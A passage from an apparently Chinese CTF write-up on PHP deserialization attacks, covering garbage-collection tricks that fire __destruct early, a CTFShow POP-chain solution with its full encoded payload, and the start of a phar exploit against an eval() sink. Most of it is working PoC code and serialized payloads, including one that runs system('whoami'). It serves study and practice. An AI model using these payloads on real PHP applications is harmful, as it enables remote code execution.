</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gc0</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$num</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gc1</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gc2</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>gc0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>num</span><span class=o>=</span><span class=k>new</span> <span class=nx>gc1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>num</span><span class=o>-&gt;</span><span class=na>string</span><span class=o>=</span><span class=k>new</span> <span class=nx>gc2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>num</span><span class=o>-&gt;</span><span class=na>string</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=o>=</span><span class=s1>&#39;system(&#34;whoami&#34;);&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$arr</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=mi>0</span><span class=o>=&gt;</span><span class=nv>$a</span><span class=p>,</span><span class=mi>1</span><span class=o>=&gt;</span><span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$arr</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>此时打入当然没有触发，记得我们绕过wakeup的方法嘛，要么加大括号要么改属性个数，那么这里尝试一下，本质就是将其指向<code>NULL</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?code=a:2:{i:0;O:3:&#34;gc0&#34;:1:{s:3:&#34;num&#34;;O:3:&#34;gc1&#34;:1:{s:6:&#34;string&#34;;O:3:&#34;gc2&#34;:1:{s:3:&#34;cmd&#34;;s:17:&#34;system(&#34;whoami&#34;);&#34;;}}}i:1;N;
</span></span><span class=line><span class=cl>成功
</span></span><span class=line><span class=cl>?code=a:2:{i:0;O:3:&#34;gc0&#34;:1:{s:3:&#34;num&#34;;O:3:&#34;gc1&#34;:2:{s:6:&#34;string&#34;;O:3:&#34;gc2&#34;:1:{s:3:&#34;cmd&#34;;s:17:&#34;system(&#34;whoami&#34;);&#34;;}}}i:1;N;}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?code=a:2:{i:0;O:3:&#34;gc0&#34;:1:{s:3:&#34;num&#34;;O:3:&#34;gc1&#34;:1:{s:6:&#34;string&#34;;O:3:&#34;gc2&#34;:1:{s:3:&#34;cmd&#34;;s:17:&#34;system(&#34;whoami&#34;);&#34;;}}}i:0;N;}
</span></span></code></pre></td></tr></table></div></div><p>都是成功了的</p><h5 id=demo-2>Demo 2</h5><p><strong>CTFShow[卷王杯]easy unserialize</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s2>&#34;./HappyYear.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>one</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$object</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>MeMeMe</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>array_walk</span><span class=p>(</span><span class=nv>$this</span><span class=p>,</span> <span class=k>function</span><span class=p>(</span><span class=nv>$fn</span><span class=p>,</span> <span class=nv>$prev</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$fn</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>===</span> <span class=s2>&#34;Happy_func&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$prev</span> <span class=o>===</span> <span class=s2>&#34;year_parm&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>global</span> <span class=nv>$talk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;</span><span class=si>$talk</span><span class=s2>&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;/br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>global</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>-&gt;</span><span class=na>add</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>-&gt;</span><span class=na>string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>second</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=k>function</span> <span class=nf>addMe</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Wow you have sovled&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$func</span><span class=p>,</span> <span class=nv>$args</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>call_user_func</span><span class=p>([</span><span class=nv>$this</span><span class=p>,</span> <span class=nv>$func</span><span class=o>.</span><span class=s2>&#34;Me&#34;</span><span class=p>],</span> <span class=nv>$args</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>third</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>string</span> <span class=o>=</span> <span class=nv>$string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$name</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$var</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$var</span><span class=p>[</span><span class=nv>$name</span><span class=p>]();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s2>&#34;ctfshow&#34;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$a</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=s2>&#34;高一新生报道&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>one::destruct-&gt;two::call-&gt;two::addMe-&gt;one::toString-&gt;third::get-&gt;one::MeMeMe
</span></span></code></pre></td></tr></table></div></div><p>首先这里有私有属性必须得直接赋值，然后<code>MeMeMe</code>又在遍历数组(键值对可以写数组也可以直接赋值)</p><p>写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>one</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$year_parm</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;Happy_func&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$object</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>second</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>third</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>one</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>=</span><span class=k>new</span> <span class=nx>second</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>-&gt;</span><span class=na>filename</span><span class=o>=</span><span class=k>new</span> <span class=nx>one</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>-&gt;</span><span class=na>filename</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>=</span><span class=k>new</span> <span class=nx>third</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;string&#34;</span><span class=o>=&gt;</span><span class=p>[</span><span class=k>new</span> <span class=nx>one</span><span class=p>(),</span><span class=s2>&#34;MeMeMe&#34;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=nv>$a</span><span class=p>,</span><span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$b</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>修改之后仍然是打不通的，找了挺久的问题，后来想着可能要把题目中的方法也包含起来才可以</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>one</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>//public $year_parm=array(&#34;Happy_func&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>public</span> <span class=nv>$year_parm</span><span class=o>=</span><span class=s2>&#34;Happy_func&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$object</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>MeMeMe</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>array_walk</span><span class=p>(</span><span class=nv>$this</span><span class=p>,</span> <span class=k>function</span><span class=p>(</span><span class=nv>$fn</span><span class=p>,</span> <span class=nv>$prev</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$fn</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>===</span> <span class=s2>&#34;Happy_func&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$prev</span> <span class=o>===</span> <span class=s2>&#34;year_parm&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>global</span> <span class=nv>$talk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;</span><span class=si>$talk</span><span class=s2>&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;/br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>global</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>-&gt;</span><span class=na>add</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>-&gt;</span><span class=na>string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>second</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=k>function</span> <span class=nf>addMe</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Wow you have sovled&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$func</span><span class=p>,</span> <span class=nv>$args</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>call_user_func</span><span class=p>([</span><span class=nv>$this</span><span class=p>,</span> <span class=nv>$func</span><span class=o>.</span><span class=s2>&#34;Me&#34;</span><span class=p>],</span> <span class=nv>$args</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>third</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$string</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>string</span> <span class=o>=</span> <span class=nv>$string</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$name</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$var</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$var</span><span class=p>[</span><span class=nv>$name</span><span class=p>]();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>one</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>=</span><span class=k>new</span> <span class=nx>second</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>-&gt;</span><span class=na>filename</span><span class=o>=</span><span class=k>new</span> <span class=nx>one</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>-&gt;</span><span class=na>filename</span><span class=o>-&gt;</span><span class=na>object</span><span class=o>=</span><span class=k>new</span> <span class=nx>third</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s2>&#34;string&#34;</span><span class=o>=&gt;</span><span class=p>[</span><span class=k>new</span> <span class=nx>one</span><span class=p>(),</span><span class=s2>&#34;MeMeMe&#34;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=nv>$a</span><span class=p>,</span><span class=k>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$b</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>修改一下，最后的payload是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?ctfshow=a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A0%3BN%3B%7D
</span></span></code></pre></td></tr></table></div></div><p>这道题还是挺有意思的，也有一些坑，方法的调用和pop链其实都挺有意思，特别是最后那个数组直接赋值隐私属性</p><h3 id=phar>phar</h3><h4 id=demo-1-1>Demo 1</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Test</span><span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span> 
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span> <span class=o>-&gt;</span> <span class=na>code</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>        <span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>];</span> 
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=k>throw</span> <span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=s2>&#34;Garbage collection&#34;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>很容易想到是phar文件反序列化，但是我们如果进行GC回收机制的利用就必须要进行签名的修改，也就是签名的重新生成，这里我们写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Test</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$code</span><span class=o>=</span><span class=s2>&#34;phpinfo();&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$o</span><span class=o>=</span><span class=k>new</span> <span class=nx>Test</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=nv>$o</span><span class=p>,</span><span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;demo.phar&#34;</span><span class=p>);</span>
